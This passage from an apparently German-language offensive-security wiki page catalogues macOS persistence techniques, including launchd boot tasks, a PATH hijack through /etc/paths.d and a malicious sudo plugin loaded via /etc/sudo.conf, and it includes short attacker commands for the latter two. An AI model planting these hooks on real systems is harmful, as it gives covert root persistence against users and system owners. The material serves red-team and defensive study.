- TCC/FDA-Gruppe: **`/etc/rc.server`**, **`/etc/rc.cdrom`**, **`/etc/rc.netboot`** (`rc.netboot` ist erst ab Sequoia vorhanden)

#### Beschreibung & Ausnutzung

Gib die eingebettete Task-Tabelle aus, um zu sehen, welche Dateien `launchd` ausführt und welche Schlüssel unterstützt werden (`Program`, `ProgramArguments`, `PerformAfterUserspaceReboot`, `RequireSuccess`…):

```bash
otool -X -s __TEXT __config /sbin/launchd | awk '{print $2 $3 $4 $5}' | \
  xxd -r -p | hexdump -v -e '1/4 "%08x"' -e '"\n"' | xxd -r -p
```

Das Erstellen einer der referenzierten Dateien (z. B. `/etc/rc.server`) veranlasst `launchd`, sie beim nächsten Neustart im Userspace auszuführen. Die nützlichsten Einträge sind durch SIP eingeschränkt oder erfordern TCC SysAdminFiles/Full Disk Access. Daher handelt es sich um eine Technik auf Root-Ebene, die beim Neustart ausgelöst wird.<sup>[[40]](#references)</sup>

### ~~NVRAM (`apple-trusted-trampoline`)~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0035/](https://theevilbit.github.io/beyond/beyond_0035/)<sup>[[41]](#references)</sup>

Die Boot-Aufgabe `rc.trampoline` führt beim Booten eine **Plattform-Binärdatei (von Apple signiert)** aus, die in der NVRAM-Variable `apple-trusted-trampoline` gespeichert ist, aber **nur, wenn das Boot-Arg `rc.trampoline=1` gesetzt und SIP deaktiviert ist** (mit einer Größenbeschränkung von ca. 390&nbsp;KB und der Einschränkung, dass die Ausführung blockierend oder schnell zurückkehrend sein muss). Da **Root-Rechte + deaktiviertes SIP + eine von Apple signierte Payload** erforderlich sind, ist diese Technik für Persistenz in der Praxis im Grunde ungeeignet und wird hier nur der Vollständigkeit halber aufgeführt.<sup>[[41]](#references)</sup>

### /etc/paths und /etc/paths.d (PATH-Hijack)

- Nützlich zum Umgehen der Sandbox: [🔴](https://emojipedia.org/large-red-circle) (zum Schreiben sind Root-Rechte erforderlich)
- Root-Rechte erforderlich

#### Speicherort

- **`/etc/paths`** und **`/etc/paths.d/*`** — werden von **`path_helper`** gelesen (aufgerufen aus `/etc/zprofile`), um den standardmäßigen `PATH` beim Login zu erstellen.

#### Beschreibung & Ausnutzung

Beide gehören Root. Wird ein vom Angreifer kontrolliertes Verzeichnis an den Anfang gesetzt (durch Bearbeiten von `/etc/paths` oder Ablegen einer Datei in `/etc/paths.d/`), erscheint dieses Verzeichnis früh im `PATH` jeder neuen Login-Shell. Dadurch **überschattet** eine schädliche Binärdatei mit dem Namen eines gängigen Befehls (`ls`, `git`, …) die echte Datei und wird ausgeführt, sobald das Opfer den Befehl das nächste Mal aufruft.

```bash
# e.g. Homebrew already ships a /etc/paths.d entry; an attacker drops their own
echo "/private/tmp/evil" | sudo tee /etc/paths.d/00-evil
# -> /private/tmp/evil is prepended to PATH for new login shells
```

### storagekitd SIP Bypass (CVE-2024-44243)

Write-up: [https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)<sup>[[46]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (root erforderlich)
- Root erforderlich; das Ergebnis **umgeht SIP**. Betroffen sind macOS-Versionen **15.0–15.1**, behoben in **15.2**

#### Speicherort

- Ein Dateisystem-Bundle in **`/Library/Filesystems/`** ablegen.

#### Beschreibung & Ausnutzung

`storagekitd` besitzt die Berechtigung **`com.apple.rootless.install.heritable`** und startete die Binärdateien von Dateisystem-Bundles mit dieser SIP-umgehenden Fähigkeit **vererbt**. Durch das Einschleusen eines bösartigen Dateisystem-Bundles konnte ein Angreifer Code mit SIP-Umgehung ausführen, um **persistente Kernel-Erweiterungen** zu installieren oder in SIP-geschützte `LaunchDaemon`-Verzeichnisse zu schreiben — eine Persistenz, die normale Schutzmaßnahmen übersteht und aushebelt.<sup>[[46]](#references)</sup> Apple hat das Problem in macOS Sequoia 15.2 behoben.

### sudo-Plugins (/etc/sudo.conf)

Write-up: [On Writing Sudo Plugins (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)<sup>[[51]](#references)</sup>

- Nützlich, um die sandbox zu umgehen: [🔴](https://emojipedia.org/large-red-circle) (root erforderlich, um `/etc/sudo.conf` zu schreiben)
- Root erforderlich für die Installation; das Plugin wird dann **bei jedem Aufruf von `sudo`** ausgeführt (setuid-root-Kontext)

#### Speicherort

- **`/etc/sudo.conf`** — `Plugin`-Zeilen laden Shared Objects aus **`/usr/libexec/sudo/`** (oder einem absoluten Pfad). Die Datei existiert standardmäßig nicht (sudo verwendet eine integrierte Policy), daher ist ihre Erstellung ein unkomplizierter Hook.

#### Beschreibung & Ausnutzung

`sudo` lädt seine Policy-/Genehmigungs-/Audit-Plugins aus `/etc/sudo.conf`. Da `sudo` setuid-root ist, wird ein bösartiges Shared-Object-Plugin **jedes Mal mit root-Rechten ausgeführt, wenn ein beliebiger Benutzer `sudo` startet** — eine dauerhafte Root-Persistenz, die außerdem jeden sudo-Befehl mitbekommt.<sup>[[51]](#references)</sup> macOS wird mit sudo 1.9.x ausgeliefert, das die Plugin-API unterstützt.

```bash
# As root: load a malicious audit/approval plugin on every sudo
cat > /etc/sudo.conf <<'CONF'
Plugin sudoers_policy sudoers.so
Plugin ht_audit /usr/libexec/sudo/ht_audit.so
CONF
# ht_audit.so's constructor / audit_open runs as root on the next `sudo <anything>`
```

### CoreMediaIO DAL Plug-Ins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>\
Minimal example: [https://github.com/johnboiles/coremediaio-dal-minimal-example](https://github.com/johnboiles/coremediaio-dal-minimal-example)<sup>[[54]](#references)</sup>

- **Veralteter Mechanismus:** Seit macOS 12.3 deprecated. macOS 14.1 und neuer deaktivieren standardmäßig veraltete Video-Plug-ins. Damit dieser Pfad funktioniert, muss ein Benutzer die Unterstützung für veraltete Video-Plug-ins aus der Recovery wiederherstellen; ein beschreibbares Verzeichnis allein reicht nicht aus. [Apples aktuelle Support-Anleitung](https://support.apple.com/en-us/108387).
- Zum Schreiben in das Plug-in-Verzeichnis sind Root-Rechte erforderlich. Eine Codeausführung hängt davon ab, ob ein kompatibler Client DAL-Plug-ins noch lädt; dies wurde unter macOS 26 nicht zur Laufzeit getestet.

#### Speicherort

- **`/Library/CoreMediaIO/Plug-Ins/DAL/*.plugin`**
  - Root-Rechte erforderlich
  - **Auslöser:** Ein kompatibler Kamera-Client listet Geräte auf, **nachdem die Unterstützung für veraltete Plug-ins wiederhergestellt wurde**. Die Library Validation des Clients kann ein Plug-in eines Drittanbieters blockieren.

#### Beschreibung & Ausnutzung

CoreMediaIO-**DAL**-Plug-ins (Device Abstraction Layer) wurden von einigen Kamera-Apps im selben Prozess geladen. Apples [Präsentation zu Kamera-Extensions](https://developer.apple.com/videos/play/wwdc2022/10022/) sagt ausdrücklich, dass veraltete DAL-Plug-ins **nicht** mit FaceTime, QuickTime Player oder Photo Booth funktionierten und viele andere Clients Library Validation erzwingen. Moderne [Core Media I/O extensions](https://developer.apple.com/documentation/coremediaio) laufen in einem separaten Prozess und verwenden ein eigenes Installations- und Genehmigungsmodell. Die historische In-Process-Technik bedeutet nicht, dass sie einen allgemeinen Camera-TCC-Bypass unter aktuellem macOS ermöglicht.<sup>[[53]](#references)[[54]](#references)</sup>

Schreibgeschützte Beobachtung unter macOS 26: `/Library/CoreMediaIO/Plug-Ins/DAL` ist vorhanden und gehört root. Weder die Unterstützung für veraltete Plug-ins noch das Laden durch einen Client wurde verifiziert.

### Directory Service Plugins

Writeup: [https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)<sup>[[53]](#references)</sup>

- **Veralteter, bedingter Mechanismus:** Installation erfordert Root-Rechte sowie ein Plug-in, das tatsächlich konfiguriert und geladen wird. Die Plug-in-API von DirectoryService ist deprecated; prüfe die Open-Directory-Konfiguration des Ziel-Macs, bevor du dies als Boot-Auslöser betrachtest.

#### Speicherort

- **`/Library/DirectoryServices/PlugIns/*.dsplug`**
  - Root-Rechte erforderlich
  - **Auslöser:** `dspluginhelperd` lädt ein geeignetes, konfiguriertes Plug-in, wenn Open Directory es benötigt. Apples [Anleitung zur Laufzeitumgebung von Plug-ins](https://developer.apple.com/library/archive/documentation/Networking/Conceptual/Open_Dir_Plugin/RuntimeEnviornment/RuntimeEnviornment.html) besagt, dass für den Start nicht konfigurierte Plug-ins unter Umständen verzögert geladen werden, wenn ihr Node geöffnet wird.

#### Beschreibung & Ausnutzung

`dspluginhelperd` unterstützt veraltete DirectoryService-Plug-in-Bundles. Ein bösartiges Plug-in kann einen privilegierten Ausführungspfad bieten, wenn das veraltete Plug-in akzeptiert und aktiviert wird; dieser Pfad unterscheidet sich von PAM- und Authorization Plugins. Dass das Verzeichnis vorhanden ist, beweist nicht, dass ein neu abgelegtes Plug-in beim nächsten Boot ausgeführt wird. Apples lokale Handbücher `dspluginhelperd(8)` und `opendirectoryd(8)` führen unter macOS 26.5 weiterhin den Helper und diesen veralteten Pfad auf.<sup>[[53]](#references)</sup>

Schreibgeschützte Beobachtung unter macOS 26: `/Library/DirectoryServices/PlugIns` und `/usr/libexec/dspluginhelperd` sind vorhanden. Während dieses Tests wurde kein Plug-in installiert, konfiguriert oder geladen.

## Persistence-Techniken und Tools

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## References

- [1] [2025, das Jahr des Infostealers](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Jenseits der guten alten LaunchAgents – 1 – Shell-Startdateien](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Jenseits der guten alten LaunchAgents – 18 – X11 und XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Jenseits der guten alten LaunchAgents – 21 – Erneut geöffnete Apps](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Jenseits der guten alten LaunchAgents – 20 – Terminal-Einstellungen](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Jenseits der guten alten LaunchAgents – 13 – Audio-Plug-ins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio-Unit-Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Jenseits der guten alten LaunchAgents – 12 – QuickLook-Plug-ins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Jenseits der guten alten LaunchAgents – 22 – LoginHook und LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Jenseits der guten alten LaunchAgents – 4 – cron-Jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Jenseits der guten alten LaunchAgents – 2 – iTerm2-Start](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Jenseits der guten alten LaunchAgents – 7 – xbar-Plug-ins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Jenseits der guten alten LaunchAgents – 8 – Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Jenseits der guten alten LaunchAgents – 6 – SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Jenseits der guten alten LaunchAgents – 3 – Anmeldeobjekte](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Jenseits der guten alten LaunchAgents – 14 – atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Jenseits der guten alten LaunchAgents – 24 – Ordneraktionen](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Ordneraktionen für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Jenseits der guten alten LaunchAgents – 27 – Dock-Kurzbefehle](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Jenseits der guten alten LaunchAgents – 17 – Farbwähler](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Jenseits der guten alten LaunchAgents – 26 – Finder-Sync-Plug-ins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyse der Persistence durch „Mac File Opener“ (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Jenseits der guten alten LaunchAgents – 16 – Bildschirmschoner](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Zugriff sichern: Bildschirmschoner für Persistence unter macOS (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Jenseits der guten alten LaunchAgents – 11 – Spotlight-Importer](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Jenseits der guten alten LaunchAgents – 9 – Einstellungsbereich](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Jenseits der guten alten LaunchAgents – 19 – Periodische Skripte](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Jenseits der guten alten LaunchAgents – 5 – Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Jenseits der guten alten LaunchAgents – 28 – Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistenter Diebstahl von Anmeldedaten mit Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Jenseits der guten alten LaunchAgents – 30 – Die man-Konfigurationsdatei man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Jenseits der guten alten LaunchAgents – 25 – Apache2-Module](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Jenseits der guten alten LaunchAgents – 31 – BSM-Audit-Framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Jenseits der guten alten LaunchAgents – 23 – emond, der Event-Monitor-Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Jenseits der guten alten LaunchAgents – 29 – amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Jenseits der guten alten LaunchAgents – 15 – xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)
- [37] [Jenseits der guten alten LaunchAgents – 10 – Anwendungsskriptdateien](https://theevilbit.github.io/beyond/beyond_0010/)
- [38] [Jenseits der guten alten LaunchAgents – 32 – Dock-Kachel-Plug-ins](https://theevilbit.github.io/beyond/beyond_0032/)
- [39] [Jenseits der guten alten LaunchAgents – 33 – Widgets](https://theevilbit.github.io/beyond/beyond_0033/)
- [40] [Jenseits der guten alten LaunchAgents – 34 – launchd-Boot-Aufgaben](https://theevilbit.github.io/beyond/beyond_0034/)
- [41] [Jenseits der guten alten LaunchAgents – 35 – Persistence über NVRAM (apple-trusted-trampoline)](https://theevilbit.github.io/beyond/beyond_0035/)
- [42] [E-Mail für Persistence unter OS X verwenden (n00py)](https://www.n00py.io/2016/10/using-email-for-persistence-on-os-x/)
- [43] [Verdächtige Änderung an der Plist einer Apple-Mail-Regel (Elastic)](https://www.elastic.co/guide/en/security/current/suspicious-apple-mail-rule-plist-modification.html)
- [44] [Bösartige Profile – eine der größten Bedrohungen für Macs (Jamf)](https://www.jamf.com/blog/malicious-profiles-come/)
- [45] [The Art of Mac Malware Vol.1 – Kap. 0x2 Persistence (dyld)](https://taomm.org/PDFs/vol1/CH%200x02%20Persistence.pdf)
- [46] [Analyse von CVE-2024-44243, einem macOS-SIP-Bypass durch Kernel-Extensions (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/01/13/analyzing-cve-2024-44243-a-macos-system-integrity-protection-bypass-through-kernel-extensions/)
- [47] [RCE und Exfiltration von API-Tokens durch Claude-Code-Projektdateien (CVE-2025-59536, Check Point)](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [48] [Neue Schwachstelle in GitHub Copilot und Cursor – Backdoor über Rules-Datei (Pillar Security)](https://www.pillar.security/blog/new-vulnerability-in-github-copilot-and-cursor-how-hackers-can-weaponize-code-agents)
- [49] [Chrome – Alternative Installationsmethoden (External Extensions)](https://developer.chrome.com/docs/extensions/how-to/distribute/install-extensions)
- [50] [ExtensionInstallForcelist in Chrome auf dem Mac entfernen (macsecurity.net)](https://macsecurity.net/view/492-extensioninstallforcelist-chrome-policy-mac)
- [51] [Sudo-Plug-ins schreiben (sigma-star)](https://blog.sigma-star.io/2025/07/on-writing-sudo-plugins/)
- [52] [Remote Mac-Exploitation über benutzerdefinierte URL-Schemes (Objective-See)](https://objective-see.org/blog/blog_0x38.html)
- [53] [Zwei macOS-Persistence-Tricks durch Missbrauch von Plug-ins (codecolorist)](https://codecolor.ist/2019/11/21/two-macos-persistence-tricks-abusing-plugins/)
- [54] [CoreMediaIO-DAL-Minimalbeispiel (johnboiles)](https://github.com/johnboiles/coremediaio-dal-minimal-example)
- [55] [Sploitlight: Analyse einer macOS-TCC-Schwachstelle auf Basis von Spotlight (Microsoft)](https://www.microsoft.com/en-us/security/blog/2025/07/28/sploitlight-analyzing-a-spotlight-based-macos-tcc-vulnerability/)
- [56] [Dokumentation des Python-Moduls `site` (.pth / usercustomize / sitecustomize)](https://docs.python.org/3/library/site.html)
- [57] [Von Spotlight zu Apple Intelligence – Missbrauch eines 0day zum Diebstahl der Daten, die macOS AI antreiben](https://objective-see.org/blog/blog_0x81.html)
- [58] [PEP 829 – Paket-Startkonfigurationsdateien](https://peps.python.org/pep-0829/)
- [59] [Python-3.15-Dokumentation zu `site` – Start-Einstiegspunkte](https://docs.python.org/3.15/library/site.html)
- [60] [autorun-audit – PEP 829 und `.start`-Dateien](https://github.com/ag3ntsc4rn/autorun-audit)
{{#include ../banners/hacktricks-training.md}}
